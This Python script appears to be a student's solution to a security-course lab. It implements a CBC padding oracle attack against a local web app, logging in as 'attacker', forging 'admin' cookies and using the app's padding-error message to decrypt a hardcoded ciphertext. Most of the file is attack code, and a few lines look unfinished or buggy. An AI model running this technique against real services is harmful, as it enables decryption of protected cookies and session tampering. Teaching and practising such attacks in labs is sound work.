import os
import requests
from cryptography.hazmat.primitives import hashes, padding, ciphers
from cryptography.hazmat.primitives.ciphers import algorithms

from cryptography.hazmat.backends import default_backend
from requests import codes, Session
import base64
import binascii
import copy

LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"

# You should implement this padding oracle object
# to craft the requests containing the mauled
# ciphertexts to the right URL.
class PaddingOracle(object):

    def __init__(self, po_url):
        self.url = po_url
        self._block_size_bytes = int(algorithms.AES.block_size/8)

    @property
    def block_length(self):
        return self._block_size_bytes

    # you'll need to send the provided ciphertext
    # as the admin cookie, retrieve the request,
    # and see whether there was a padding error or not.
    def test_ciphertext(self, ciphertext_blocks):
        # print(ciphertext_blocks)
        sess = Session()
        username = "attacker"
        password = "attacker"
        login_data_dict = {"username": username,
                         "password": password,
                         "login": "Login"
                         }
        response = sess.post(LOGIN_FORM_URL, login_data_dict)
        assert (response.status_code == codes.ok)

        sess.cookies.set('admin', ciphertext_blocks, domain='localhost.local', path='/')
        setcoin_data_dict = {"username": "attacker",\
                             "amount": '0'}
        response = sess.post(self.url, setcoin_data_dict)
        return "Bad padding for admin cookie!" not in response.text


def split_into_blocks(msg, l):
    while msg:
        yield msg[:l]
        msg = msg[l:]
    
def po_attack_2blocks(po, ctx):
    """Given two blocks of cipher texts, it can recover the first block of
    the message.
    @po: an instance of padding oracle. 
    @ctx: a ciphertext (bytearray)
    """
    print("ctx: ", ctx)
    assert len(ctx) == 2 * po.block_length, "This function only accepts 2 block "\
        "cipher texts. Got {} block(s)!".format(len(ctx)/po.block_length)
    c0_hex_bytearray, c1_hex_bytearray = list(split_into_blocks(ctx, po.block_length))
    print("c0 c1: ", c0_hex_bytearray, c1_hex_bytearray)
    intermediate = bytearray(16)
    msg_bytes = bytearray(16)
    # TODO: Implement padding oracle attack for 2 blocks of messages.
    for i in range(1, 17):
        c0 = copy.deepcopy(c0_hex_bytearray)
        c1 = copy.deepcopy(c1_hex_bytearray)
        for k in range(i):
            c0[-k] = intermediate[-k] ^ i
        hit = False
        for j in range(256):
            c0[-i] = j

            test_cipher = (c1_hex_bytearray + c0 + c1).hex()
            if i == 16:
                test_cipher
            valid = po.test_ciphertext(test_cipher)
            if i == 1 and valid:
                print("i = 1 found: ", j)
                c0[-2] ^= 1
                test_cipher = (c1_hex_bytearray + c0 + c1).hex()
                if po.test_ciphertext(test_cipher):
                    hit = True
                    break
            elif valid:
                hit = True
                print("found {}: ".format(i), j)
                break
        assert hit
        intermediate[-i] = i ^ j
        m_byte = c0_hex_bytearray[-i] ^ intermediate[-i]
        msg_bytes[-i] = m_byte
    msg = bytes(msg_bytes).decode('utf-8')
    print(type(msg))
    msg.replace('\r', '')
    return msg

def po_attack(po, ctx):
    """
    Padding oracle attack that can decrpyt any arbitrary length messages.
    @po: an instance of padding oracle. 
    You don't have to unpad the message.
    """
    ctx_blocks = list(split_into_blocks(ctx, po.block_length))
    messages = []
    for i in range(len(ctx_blocks)-1):
        two_block_ctx = ctx_blocks[-i-2] + ctx_blocks[-i-1]
        messages.append(po_attack_2blocks(po, two_block_ctx))
    messages = messages[::-1]
    print("".join(messages))
    return "".join(messages)
    
    # TODO: Implement padding oracle attack for arbitrary length message.

if __name__=='__main__':
    po = PaddingOracle(SETCOINS_FORM_URL)

    # from app.api.encr_decr import Encryption
    #
    # encryption_key = b'\x00' * 16
    # cbc = Encryption(encryption_key)
    # password = 'world'
    # ct = cbc.encrypt(password.encode('utf-8')).hex()

    ct = "e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d"
    ctxt_bytes = bytearray.fromhex(ct)
    po_attack(po, ctxt_bytes)
